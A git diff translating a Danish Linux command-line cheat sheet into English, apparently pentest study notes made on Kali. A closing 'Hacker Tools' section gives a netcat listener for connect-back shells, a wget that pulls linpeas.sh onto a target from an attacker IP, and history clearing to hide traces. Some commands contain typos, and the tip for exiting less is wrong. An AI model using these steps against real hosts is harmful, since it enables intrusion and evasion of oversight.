@@ -1,6 +1,6 @@
-# Linux Kommandolinje
+# Linux Command Line
 ## directory traversal
-1.1 pwd - Nuværende position i en sti
+1.1 pwd - Current position in a path
 ```bash
 pwd
 ```
@@ -9,7 +9,7 @@ pwd
 └─$ pwd         
 /home/kali
 ```
-1.2 skift directory/mappe
+1.2 change directory/folder
 ```bash
 cd /your/path
 ```
@@ -20,7 +20,7 @@ cd /your/path
 ┌──(kali㉿kali)-[/etc]
 └─$ 
 ```
-1.3 dan dig et overblik over mapper og filer
+1.3 get an overview of folders and files
 ```bash
 tree
 ```
@@ -52,7 +52,7 @@ tree
 │   ├── ALTER_CONVERSION.7.gz -> /usr/share/postgresql/17/man/man7/ALTER_CONVERSION.7.gz
 
 ```
-1.4 Find en specific mappe eller fil
+1.4 Find a specific folder or file
 ```bash
 find -name "target.example"
 ```
@@ -65,7 +65,7 @@ find -name "target.example"
 ./.local/share/Trash/files/BastionHostingCreds (2)/passwords.txt
 ./passwords.txt
 ```
-1.5 Find en specific mappe eller fil uden at være case sensitive
+1.5 Find a specific folder or file without being case sensitive
 ```bash
 find -iname "target.example"
 ```
@@ -78,7 +78,7 @@ find -iname "target.example"
 ./.local/share/Trash/files/BastionHostingCreds (2)/passwords.txt
 ./passwords.txt
 ```
-1.6 Find fil efter type
+1.6 Find file by type
 ```bash
 find , -name "*conf"
 ```
@@ -93,7 +93,7 @@ find , -name "*conf"
 ./.goenv/versions/1.23.1/src/net/testdata/linux-use-vc-resolv.conf
 ./.goenv/versions/1.23.1/src/net/testdata/large-ndots-resolv.conf
 ```
-1.7 Find fil efter størrelse hvor "+100M" betyder mere end 100 Megabytes".  Med "/" for root og systemet og med "." for nuværende mappe.
+1.7 Find file by size where "+100M" means more than 100 Megabytes". Use "/" for root and system and "." for current folder.
 ```bash
 find . -size +100M
 ```
@@ -104,7 +104,7 @@ find . -size +100M
 ./google-chrome-stable_current_amd64.deb.1
 ./.BurpSuite/burpbrowser/139.0.7258.127/chrome
 ```
-1.8 Find filer der er ændret for nyligt hvor "-10" betyder "less than 10". Med "/" for root og systemet og med "." for nuværende mappe.
+1.8 Find files that were modified recently where "-10" means "less than 10". Use "/" for root and system and "." for current folder.
 ```bash
 find . -mmin -10
 ```
@@ -121,7 +121,7 @@ find . -mmin -10
 ```
 
 ## 2. list (ls)
-2.1 ls (list) - viser indholdet i den mappe du befinder dig i.
+2.1 ls (list) - shows the content in the folder you are in.
 ```bash
 ls
 ```
@@ -134,7 +134,7 @@ article.html        google-chrome-stable_current_amd64.deb.1  Public
 combined.txt        mender.req                                replay_pid1882.log
 Desktop             mender.txt                                Templates
 ```
-2.2 for at se skjulte filer og rettigheder
+2.2 to see hidden files and permissions
 ```bash
 ls -la
 ```
@@ -151,7 +151,7 @@ drwxr-xr-x  3 root root      4096 Sep  9 06:19 ..
 -rw-r--r--  1 kali kali      3526 Sep  9 06:19 .bashrc.original
 drwx------  8 kali kali      4096 Nov 16 10:51 .BurpSuite
 ```
-2.3 for at se alle filerne i human readable
+2.3 to see all files in human readable format
 ```bash
 ls -ah
 ```
@@ -169,7 +169,7 @@ article.html        google-chrome-stable_current_amd64.deb    replay_pid1882.log
 .BurpSuite          .local                                    udp_scan.txt
 .cache              mender.req                                userpass.txt
 ```
-2.4 Se filstørrelse i humand readable
+2.4 See file size in human readable format
 ```bash
 ls -lh
 ```
@@ -186,7 +186,7 @@ drwxr-xr-x 2 kali kali 4.0K Oct 23 06:27 Documents
 drwxr-xr-x 2 kali kali 4.0K Nov 22 13:46 Downloads
 -rw-r--r-- 1 kali kali 2.8K Aug  9  2021 emails.txt
 ```
-2.5 hvis du ønsker at sortere med sidst ændret først (brug -tr for omvendt rækkefølge)
+2.5 if you want to sort with recently modified first (use -tr for reverse order)
 ```bash
 ls -t
 ```
@@ -201,7 +201,7 @@ userpass.txt            1to100.py                                 AbuIshak.ovpn 
 passwords.txt           Desktop                                   Documents           emails.txt
 users.txt               ngrok-v3-stable-linux-amd64.tgz           Music
 ```
-2.6 Sorteret med sidst ændret først og skjulte filer inkluderet (brug -atr for omvendt rækkefølge)
+2.6 Sorted with recently modified first and hidden files included (use -atr for reverse order)
 ```bash
 ls -at
 ```
@@ -216,7 +216,7 @@ ls -at
 udp_scan.txt                              .pyenv                           Pictures
 fragmentation_scan.txt                    .goenv                           Public
 ```
-2.7 Sorteret efter størrelse, største først (brug --lSr for omvendt rækkefølge)
+2.7 Sorted by size, largest first (use -lSr for reverse order)
 ```bash
 ls -lS
 ```
@@ -233,7 +233,7 @@ total 265164
 -rw------- 1 kali kali      8302 Oct 23 07:09 AbuIshak.ovpn
 drwxr-xr-x 2 kali kali      4096 Oct 30 11:31 Desktop
 ```
-2.8 Se alle filer i en mappe med dens under-mapper og filer
+2.8 See all files in a folder with its subfolders and files
 ```bash
 ls -R
 ```
@@ -257,7 +257,7 @@ emails.txt     Music                                     replay_pid1882.log
 ./Downloads:
 cacert.der  chinese-names.txt.gz  >>>>>>>>> >>>>>>>>> DenneFilLiggerIDownloads.txt <<<<<<<<< <<<<<<<<<
 ```
-2.9 Klassificer filetyper, for en klar forståelse. Denne sætter eksempelvis et "*" på slutningen af filer som kan køres
+2.9 Classify file types for a clear understanding. This will, for example, put an "*" at the end of files that can be executed
 ```bash
 ls -F
 ```
@@ -269,8 +269,8 @@ AbuIshak.ovpn  fragmentation_scan.txt                    ngrok-v3-stable-linux-a
 article.html   google-chrome-stable_current_amd64.deb    numbers.txt                      userpass.txt
 combined.txt   google-chrome-stable_current_amd64.deb.1  passwords.txt                    users.txt
 ```
-## 3. Læsning og inspektion af filer
-3.1 Print alt indeholdet af en fil ud på en gang
+## 3. Reading and inspection of files
+3.1 Print all content of a file at once
 ```bash
 cat target.file
 ```
@@ -282,7 +282,7 @@ admin password
 user 123456
 guest admin
 ```
-3.2 Åben en fil i en "reader-mode" hvor du kan scroll op og ned (tryk CTRL+Z for at komme ud af filen)
+3.2 Open a file in a "reader-mode" where you can scroll up and down (press CTRL+Z to exit the file)
 ```bash
 less target.file
 ```
@@ -309,7 +309,7 @@ love123
 :
 (END)
 ```
-3.3 Læs en fils første 10 linjer (brug -n xyz for et specifikt antal linjer fra første linje)
+3.3 Read a file's first 10 lines (use -n xyz for a specific number of lines from the first line)
 ```bash
 head target.file
 ```
@@ -327,7 +327,7 @@ rockyou
 12345678
 abc123
 ```
-3.4 Læs en fils sidste 10 linjer 
+3.4 Read a file's last 10 lines 
 ```bash
 tail target.file
 ```
@@ -345,7 +345,7 @@ abygurl69
 a6_123
 *7¡Vamos!
 ```
-3.5 Læs en fils sidste 10 linjer og følg med live på de nyeste tilføjelser
+3.5 Read a file's last 10 lines and follow live on the latest additions
 ```bash
 tail -f target.file
 ```
@@ -364,7 +364,7 @@ sadja9fgaj
 sidste
 denne linje er sat på live
 ```
-3.6 Søg efter en specifik tekst inde i en fil der kun de linjer der matcher (brug -i option for at søge case-insensitive)
+3.6 Search for specific text inside a file that matches only those lines (use -i option to search case-insensitive)
 ```bash
 grep "søgeord" target.file
 ```
@@ -376,7 +376,7 @@ h
 ads1237asdh92ghad
 7129afladas87zxfjfaksdasdh
 ```
-3.7 Find ud af hvilken type en fil er (bruges fordi en fil kan have et fake filnavn for skjule information)
+3.7 Find out what type a file is (used because a file can have a fake filename to hide information)
 ```bash
 file target.file
 ```
@@ -385,8 +385,8 @@ file target.file
 └─$ file TestFil.txt
 TestFil.txt: Unicode text, UTF-8 text
 ```
-## 4. Fil manipulation
-4.1 Output file direction med ">"
+## 4. File manipulation
+4.1 Output file direction with ">"
 ```bash
 example.scan > ScanList.txt
 ```
@@ -411,7 +411,7 @@ combined.txt
 Desktop
 .dmrc
 ```
-4.2 Tilføj noget til en fil med eksempelvis echo og ">>"
+4.2 Add something to a file with for example echo and ">>"
 ```bash
 echo TargetText >> TargetFile.txt                    
 ```
@@ -425,7 +425,7 @@ Test2Fil
 TestFil.txt
 TargetText
 ```
-4.3 Tag outputtet fra noget i venstre side og giv det til noget i højre ned Pipe " | ". 
+4.3 Take the output from something on the left side and give it to something on the right with Pipe " | ". 
 ```bash
 cat Example.file | grep "Example Text"                  
 ```
@@ -434,19 +434,19 @@ cat Example.file | grep "Example Text"
 └─$ cat TestFil2.txt | grep "Target"
 TargetText                 
 ```
-Du kan eksempelvis også tail -f en fil også pipe den til en grep "søgeord" for at se om der bliver tilføjet det søgeord live til den fil du follower
+You can for example also tail -f a file and pipe it to a grep "search word" to see if that search word is being added live to the file you are following
 ```bash
 tail -f TestFil2.txt | grep "Important Keyword"              
 ```
-Egentlig kan du pipe uendeligt til dine egne behov. Her er en pipe der først henter data fra en fil, filtrerer dataen, sorterer det, fjerner alle doubles (uniq) og til sidst skærer alt andet fra og viser kun de 5 øverste resultater.
+Actually you can pipe infinitely to your own needs. Here is a pipe that first fetches data from a file, filters the data, sorts it, removes all duplicates (uniq) and finally cuts everything else and shows only the 5 top results.
 ```bash
 cat list.txt | grep "admin" | sort | uniq | head -n 5            
 ```
-4.3 Tekst-editor i kommandolinjen. Brug nano til at manuelt at skrive i en fil
+4.3 Text editor in the command line. Use nano to manually write in a file
 ```bash
 nano Example.File             
 ```
-4.4 Fjern eller erstat et tegn i en fil
+4.4 Remove or replace a character in a file
 ```bash
 cat Example.File | tr "A" "B"                  
 ```
@@ -467,7 +467,7 @@ TestFil.txt
 TargetText
 AammelText              
 ```
-4.5 Erstat et ord med et andet
+4.5 Replace a word with another
 ```bash
 cat Example.File | sed 's/OldWord/NewWord/g'                  
 ```
@@ -480,7 +480,7 @@ TestFil.txt
 TargetText
 NyText
 ```
-4.6 opret en ny tom fil
+4.6 create a new empty file
 ```bash
 touch Example.File               
 ```
@@ -488,7 +488,7 @@ touch Example.File
 ┌──(kali㉿kali)-[~]
 └─$ touch NyFil.txt  
 ```
-4.7 kopierer en fil
+4.7 copy a file
 ```bash
 cp Example.file copy                  
 ```
@@ -496,24 +496,24 @@ cp Example.file copy
 ┌──(kali㉿kali)-[~]
 └─$ cp NyFil.txt NyFil2.txt   
 ```
-4.8 slet en fil
+4.8 delete a file
 ```bash
 rm Example.file         
 ```
 ```console
 └─$ rm NyFil2.txt  
 ```
-4.9 fjern en mappe og alt hvad der i den uden at spørge om lov
+4.9 remove a folder and everything in it without asking permission
 ```bash
 rm -rf Folder         
 ```
 
-## 5. Netværk
-5.1 se din IP adresser 
+## 5. Network
+5.1 see your IP addresses 
 ```bash
 ip a
 ```
-5.2 Ping en host for at se om den er live 
+5.2 Ping a host to see if it is alive 
 ```bash
 pink [host]
 ```
@@ -526,12 +526,12 @@ PING dr.dk (95.166.124.137) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 2.679/2.679/2.679/0.000 ms
 ```
-5.3 Secure Shell login på en fjerncomputer, krypteret
+5.3 Secure Shell login on a remote computer, encrypted
 ```bash
 ssh username@host
 ```
-Kan tilføje -i hvis der skal knyttes en nøglefil til loginet
-5.4 Slå et domænenavn op for at finde IP-adressen
+Can add -i if a key file should be attached to the login
+5.4 Look up a domain name to find the IP address
 ```bash
 nslookup google.com
 ```
@@ -547,7 +547,7 @@ Address: 216.58.207.238
 Name:   google.com
 Address: 2a00:1450:400f:803::200e
 ```
-5.5 Hvis du vil se hvilken rute din afsendte pakker tager fra din computer til målet
+5.5 If you want to see which route your sent packages take from your computer to the target
 ```bash
 traceroute host
 ```
@@ -563,8 +563,8 @@ traceroute to google.com (216.58.207.238), 30 hops max, 60 byte packets
  6  209.85.242.83 (209.85.242.83)  15.126 ms  13.911 ms  15.923 ms
  7  arn09s19-in-f14.1e100.net (216.58.207.238)  11.719 ms  12.255 ms  11.675 ms
 ```
-## 6. Hacker Værktøjer
-6.1 Åben en "lytte-port" på din egen maskine som venter på noget forbinder tilbage til din maskine
+## 6. Hacker Tools
+6.1 Open a "listen-port" on your own machine that waits for something to connect back to your machine
 ```bash
 nc lvnp 4444        
 ```
@@ -573,19 +573,19 @@ nc lvnp 4444
 └─$ nc -lvnp 4444    
 listening on [any] 4444 ...
 ```
-6.2 Omdan en mappe til en hjemmeside og download dine filer fra target host
+6.2 Turn a folder into a website and download your files from target host
 ```bash
 pyton3 -m http.server [port]      
 ```
-6.3 Download som bruges på target host til at hente filer fra din maskine
+6.3 Download used on target host to fetch files from your machine
 ```bash
 wget http://10.10.10.5:8000/linpeas.sh   
 ```
-6.4 Gør en fil runable, eksempelvis en ond tekstfil som bliver til et script efter den bliver gjort runable
+6.4 Make a file runnable, for example a malicious text file that becomes a script after it is made runnable
 ```bash
 chmod +x exploit.sh
 ```
-6.5 Slet terminalens hukommelse og logud så der er færre spor af dit besøg på target host
+6.5 Clear the terminal's memory and log out so there are fewer traces of your visit on the target host
 ```bash
 history -c && exit
 ```
